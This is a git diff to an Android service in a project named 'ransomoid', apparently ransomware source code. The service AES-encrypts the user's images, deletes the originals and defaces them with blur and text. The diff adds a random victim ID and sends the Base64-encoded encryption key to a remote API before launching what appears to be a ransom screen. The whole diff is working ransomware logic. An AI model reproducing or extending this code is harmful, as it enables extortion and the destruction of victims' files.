@@ -4,13 +4,17 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.Environment;
 import android.os.IBinder;
+import android.util.Base64;
 import android.widget.Toast;
 
 import java.io.File;
 import java.util.ArrayList;
+import java.util.UUID;
 
 import falezza.fabio.ransomoid.activities.EncryptedActivity;
 import falezza.fabio.ransomoid.utils.AesEncrypter;
+import falezza.fabio.ransomoid.utils.Api;
+import falezza.fabio.ransomoid.utils.AppDelegate;
 import falezza.fabio.ransomoid.utils.FileProcessor;
 import falezza.fabio.ransomoid.utils.ImageProcessor;
 
@@ -38,11 +42,9 @@ public class EncryptService extends Service {
             ImageProcessor imgProcessor = ImageProcessor.getInstance(this);
             AesEncrypter aesEncrypter = AesEncrypter.getInstance();
             aesEncrypter.generateRandomKey();
-            FileProcessor fileProcessor = FileProcessor.getInstance();
+            this.generateId();
             for (File img : this.imgList) {
-                System.out.println(img.getPath());
                 if (!isEncrypted(img)) {
-                    this.generateKey();
                     imgProcessor.setFile(img);
                     imgProcessor.blur();
                     imgProcessor.drawText();
@@ -50,18 +52,25 @@ public class EncryptService extends Service {
 
                     aesEncrypter.setFile(img);
                     byte[] encrypted = aesEncrypter.encrypt();
-                    fileProcessor.writeBytesToFile(encrypted, img.getPath() + ".enc");
+                    FileProcessor.getInstance().writeBytesToFile(encrypted,
+                            img.getPath() + ".enc");
 
                     if (!img.delete()) {
                         throw new Exception("Cannot delete file");
                     }
                 }
             }
-            Intent intent = new Intent(this, EncryptedActivity.class);
-            startActivity(intent);
+
+            Api.getInstance(this).send(
+                    AppDelegate.getInstance(this).getByTag(AppDelegate.userID),
+                    Base64.encodeToString(aesEncrypter.getKey(), Base64.DEFAULT));
+
         } catch (Exception e) {
             e.printStackTrace();
         }
+
+        Intent intent = new Intent(this, EncryptedActivity.class);
+        startActivity(intent);
     }
 
     @Override
@@ -73,8 +82,8 @@ public class EncryptService extends Service {
         return file.getPath().contains(".enc");
     }
 
-    private void generateKey() {
-
-        //LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,key);
+    private void generateId() {
+        String uniqueID = UUID.randomUUID().toString();
+        AppDelegate.getInstance(this).saveUserID(uniqueID);
     }
 }
